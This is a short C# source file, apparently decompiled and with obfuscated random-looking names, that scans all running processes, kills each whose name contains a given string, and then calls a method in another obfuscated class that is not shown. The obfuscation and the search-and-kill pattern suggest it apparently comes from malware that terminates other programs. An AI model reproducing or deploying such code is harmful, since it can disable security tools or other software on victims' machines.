using System;
using System.Diagnostics;

namespace gTywbHaKSaZFRYP;

public sealed class qjdmedaHexQ
{
	public static bool GqdkrviYxH(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void GpJZRApyBtwZw(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (GqdkrviYxH(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					PYtJscelCaHU.vNWFGBoTjkX();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
